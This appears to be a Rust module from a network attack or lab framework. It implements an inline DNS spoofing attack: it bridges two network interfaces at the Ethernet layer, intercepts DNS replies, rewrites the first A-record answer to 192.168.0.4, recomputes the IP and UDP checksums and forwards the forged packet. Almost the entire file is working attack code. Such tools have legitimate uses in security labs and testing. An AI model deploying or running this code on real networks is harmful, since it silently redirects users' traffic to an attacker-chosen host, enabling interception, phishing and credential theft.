use axum::body::Bytes;
use dns_message_parser::rr::RR;
use dns_message_parser::{Dns as DnsMessage, DomainName};
use erased_serde::Serialize as ErasedSerialize;
use pnet::packet::ipv4::{self, MutableIpv4Packet};
use pnet::packet::udp::{self, MutableUdpPacket};
use pnet::packet::MutablePacket;
use pnet_datalink::Channel::Ethernet;
use pnet_datalink::{self, DataLinkReceiver, DataLinkSender, NetworkInterface};
use serde::Serialize;
use std::net::Ipv4Addr;
use std::str::FromStr;
use tokio::task::spawn_blocking;
use tracing::{error, info};

use super::attack::Attack;
use pnet::packet::{
    ethernet::{
        EtherTypes::{self, Ipv4},
        EthernetPacket, MutableEthernetPacket,
    },
    ip::IpNextHeaderProtocols,
    ipv4::Ipv4Packet,
    udp::UdpPacket,
    Packet,
};

pub struct Dns {
    pub interface1_name: String,
    pub interface2_name: String,
}

#[derive(Serialize)]
struct DnsPacket {
    foo: u32,
}

impl Attack for Dns {
    fn get_logs(&self) -> Vec<Box<dyn ErasedSerialize>> {
        vec![Box::new(DnsPacket { foo: 0 })]
    }
    fn start(&mut self) {
        let modifier = |mut rx_channel: Box<dyn DataLinkReceiver>,
                        mut tx_channel: Box<dyn DataLinkSender>| {
            //let modifier = |rx_interface_name: String, tx_interface_name: String| {
            move || {
                info!("started DNS modification attack worker thread");

                // Find the network interface with the provided name
                loop {
                    while let Ok(rx_raw) = rx_channel.next() {
                        if let Some(rx_ethernet_frame) = EthernetPacket::new(rx_raw) {
                            info!("{:?}", rx_ethernet_frame);
                            info!("Size: {}", rx_ethernet_frame.packet().len());
                            if rx_ethernet_frame.get_ethertype() == EtherTypes::Ipv4 {
                                if let Some(rx_ipv4_packet) =
                                    Ipv4Packet::new(rx_ethernet_frame.payload())
                                {
                                    if rx_ipv4_packet.get_next_level_protocol()
                                        == IpNextHeaderProtocols::Udp
                                    {
                                        if let Some(rx_udp_packet) =
                                            UdpPacket::new(rx_ipv4_packet.payload())
                                        {
                                            if rx_udp_packet.get_source() == 53
                                                || rx_udp_packet.get_destination() == 53
                                            {
                                                info!("Found DNS packet");
                                                match DnsMessage::decode(Bytes::from(
                                                    rx_udp_packet.payload().to_vec(),
                                                )) {
                                                    Ok(mut rx_dns_packet) => {
                                                        info!(
                                                            "Parsed DNS packet: {:?}",
                                                            rx_dns_packet
                                                        );
                                                        // true for reply
                                                        if rx_dns_packet.flags.qr {
                                                            info!(
                                                                "Modifying query for: {:?}",
                                                                rx_dns_packet.questions[0]
                                                                    .domain_name
                                                            );
                                                            if let RR::A(a) =
                                                                &mut rx_dns_packet.answers[0]
                                                            {
                                                                a.ipv4_addr =
                                                                    Ipv4Addr::new(192, 168, 0, 4)
                                                            }
                                                            let mut buf: [u8; 94] = [0; 94];
                                                            if let Some(mut tx_ethernet_frame) =
                                                                MutableEthernetPacket::new(
                                                                    buf.as_mut_slice(),
                                                                )
                                                            {
                                                                info!("rebuilding ethernet");
                                                                tx_ethernet_frame
                                                                    .clone_from(&rx_ethernet_frame);

                                                                if let Some(mut tx_ipv4_packet) =
                                                                    MutableIpv4Packet::new(
                                                                        tx_ethernet_frame
                                                                            .payload_mut(),
                                                                    )
                                                                {
                                                                    info!("rebuilding ip");
                                                                    let source_ip =
                                                                        tx_ipv4_packet.get_source();
                                                                    let destination_ip =
                                                                        tx_ipv4_packet
                                                                            .get_destination();
                                                                    tx_ipv4_packet.clone_from(
                                                                        &rx_ipv4_packet,
                                                                    );
                                                                    tx_ipv4_packet.set_checksum(
                                                                        ipv4::checksum(
                                                                            &tx_ipv4_packet
                                                                                .to_immutable(),
                                                                        ),
                                                                    );
                                                                    if let Some(mut tx_udp_packet) =
                                                                        MutableUdpPacket::new(
                                                                            tx_ipv4_packet
                                                                                .payload_mut(),
                                                                        )
                                                                    {
                                                                        info!("rebuilding udp");
                                                                        if let Ok(tx_dns_packet) =
                                                                            rx_dns_packet.encode()
                                                                        {
                                                                            info!("rebuilding dns");
                                                                            tx_udp_packet
                                                                                .clone_from(
                                                                                    &rx_udp_packet,
                                                                                );
                                                                            tx_udp_packet
                                                                                .set_payload(
                                                                                    &tx_dns_packet,
                                                                                );
                                                                            tx_udp_packet
                                                                                .set_checksum(udp::ipv4_checksum(&tx_udp_packet.to_immutable(),&source_ip,&destination_ip));
                                                                            /*
                                                                            tx_udp_packet
                                                                                .set_length(
                                                                                    tx_dns_packet
                                                                                        .len()
                                                                                        .try_into()
                                                                                        .unwrap(),
                                                                                );
                                                                            */
                                                                        }
                                                                    }
                                                                }

                                                                info!("{:?}", tx_ethernet_frame);
                                                                info!(
                                                                    "{:02x?}",
                                                                    tx_ethernet_frame.packet()
                                                                );
                                                                tx_channel.send_to(
                                                                    tx_ethernet_frame.packet(),
                                                                    None,
                                                                );
                                                            }
                                                            continue;
                                                        }
                                                    }
                                                    Err(e) => {
                                                        error!("{}", e)
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        tx_channel.send_to(rx_raw, None);
                        ()
                    }
                }
            }
        };
        let interface1 = pnet_datalink::interfaces()
            .into_iter()
            .filter(|iface: &NetworkInterface| iface.name == self.interface1_name)
            .next()
            .unwrap();
        let interface2 = pnet_datalink::interfaces()
            .into_iter()
            .filter(|iface: &NetworkInterface| iface.name == self.interface2_name)
            .next()
            .unwrap();

        let (tx_channel1, rx_channel1) =
            match pnet_datalink::channel(&interface1, Default::default()) {
                Ok(Ethernet(tx, rx)) => (tx, rx),
                Ok(_) => panic!("Unhandled channel type"),
                Err(e) => panic!(
                    "An error occurred when creating the datalink channel: {}",
                    e
                ),
            };
        let (tx_channel2, rx_channel2) =
            match pnet_datalink::channel(&interface2, Default::default()) {
                Ok(Ethernet(tx, rx)) => (tx, rx),
                Ok(_) => panic!("Unhandled channel type"),
                Err(e) => panic!(
                    "An error occurred when creating the datalink channel: {}",
                    e
                ),
            };
        spawn_blocking(modifier(rx_channel1, tx_channel2));
        spawn_blocking(modifier(rx_channel2, tx_channel1));
        ()
    }
    fn stop(&mut self) {}
}
